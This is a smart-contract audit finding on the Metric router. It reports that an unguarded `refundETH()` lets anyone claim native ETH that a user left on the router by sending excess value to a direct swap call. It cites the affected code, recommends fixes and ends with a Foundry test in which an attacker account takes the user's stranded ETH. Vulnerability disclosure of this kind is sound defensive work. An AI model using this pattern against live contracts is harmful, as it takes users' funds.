### Title
Unguarded `refundETH()` allows any caller to steal stranded native ETH left by a prior user's excess-value swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`refundETH()` unconditionally transfers the router's entire native ETH balance to `msg.sender` with no check that the caller is the original depositor. Because `exactInputSingle` (and other payable swap entry points) consume only the exact `amountIn` worth of ETH and leave any excess on the router without an automatic refund, a user who calls a swap directly with excess `msg.value` strands ETH on the router. Any attacker can then call `refundETH()` in a separate transaction and receive that ETH.

---

### Finding Description

`refundETH()` is implemented as:

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);
    }
}
``` [1](#0-0) 

There is no check that `msg.sender` is the address that originally deposited the ETH. It sends the full contract balance to whoever calls it.

ETH is stranded on the router by the `pay()` helper when `token == WETH` and the router holds more native ETH than the swap requires:

```solidity
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();
    IERC20(WETH).safeTransfer(recipient, value);
}
``` [2](#0-1) 

Only exactly `value` ETH is wrapped; the remainder stays as native ETH on the router. `exactInputSingle` performs no automatic refund after the swap completes: [3](#0-2) 

The intended safe pattern — confirmed by the existing test — is to bundle the swap with `refundETH()` inside a `multicall`. But `exactInputSingle` is a standalone `payable` function that any caller can invoke directly with excess ETH, and the contract provides no protection against that: [4](#0-3) 

The `receive()` guard (only WETH can push ETH) does not help here because the ETH arrives via the `payable` function call itself, not via a bare transfer. [5](#0-4) 

---

### Impact Explanation

Direct loss of user ETH principal. A user who calls `exactInputSingle{value: 2 ether}` with `amountIn = 1 ether` loses the surplus 1 ETH to any attacker who front-runs or back-runs with a `refundETH()` call in a separate transaction. The attacker needs no special privileges, no approvals, and no capital.

---

### Likelihood Explanation

Any user who calls a payable swap function directly (without wrapping in `multicall` + `refundETH`) is vulnerable. This is a realistic mistake: the function signature accepts `msg.value` with no warning, and the contract silently retains the surplus. MEV bots routinely monitor for stranded ETH on router contracts and will extract it within the same block.

---

### Recommendation

Two complementary fixes:

1. **Automatic refund at swap exit**: at the end of `exactInputSingle`, `exactInput`, `exactOutputSingle`, and `exactOutput`, refund any remaining `address(this).balance` to `msg.sender`.

2. **Restrict `refundETH()` to the original payer**: record the payer in transient storage at the start of each payable entry point and require `msg.sender == storedPayer` inside `refundETH()`. This is the same pattern already used for the callback payer context.

---

### Proof of Concept

```solidity
// Foundry test sketch
function test_attacker_steals_stranded_eth() public {
    address user    = makeAddr("user");
    address attacker = makeAddr("attacker");
    vm.deal(user, 2 ether);

    // User calls exactInputSingle directly with 2 ETH but amountIn = 1 ETH
    vm.prank(user);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1 ether,          // only 1 ETH consumed
            amountOutMinimum: 0,
            recipient: user,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // 1 ETH is now stranded on the router
    assertEq(address(router).balance, 1 ether);

    // Attacker steals it in a separate transaction
    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance, 1 ether, "attacker stole user ETH");
    assertEq(user.balance,     0,       "user received nothing");
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L75-77)
```text
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
